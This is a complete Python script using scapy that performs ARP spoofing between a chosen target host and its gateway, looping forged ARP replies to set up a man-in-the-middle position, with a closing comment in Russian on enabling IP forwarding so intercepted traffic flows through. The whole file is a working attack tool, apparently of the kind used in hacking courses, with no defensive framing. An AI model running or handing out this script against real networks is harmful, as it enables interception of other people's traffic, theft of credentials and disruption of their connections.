#!/usr/bin/env/ python

import scapy.all as scapy
from time import sleep
import argparse
from colorama import init, Fore


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="IP for: 192.168.1.1")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="IP : 192.168.2.1")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error(Fore.RED + "[-]" + Fore.GREEN + "Please specify the target IP, use --help for more info.")
    if not options.gateway_ip:
        parser.error(Fore.RED + "[-]" + Fore.GREEN + "Please specify the gateway IP, use --help for more info.")

    return options.target_ip, options.gateway_ip


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    ether_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = ether_broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    mac = answered_list[0][1].hwsrc
    return mac


def spoof(ip_target, mac_target, ip_spoof):
    # target_mac = get_mac(ip_target)
    packet = scapy.ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_spoof)
    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


if __name__ == "__main__":
    init(autoreset=True)
    target_ip, gateway_ip = get_arguments()
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    send_packets_count = 0
    try:
        while True:
            spoof(target_ip, target_mac, gateway_ip)
            spoof(gateway_ip, gateway_mac, target_ip)
            send_packets_count += 2
            print(Fore.YELLOW + f"\r[+] Packets sent: {str(send_packets_count)}.", end='')
            sleep(2)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[+] Detecting CTRL+C. Quiting...")
        print(Fore.RED + "[+] Resetting ARP tables... ")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)

# echo 1> /proc/sys/net/ipv4/ip_forward для разрешения прохождения трафика через комп
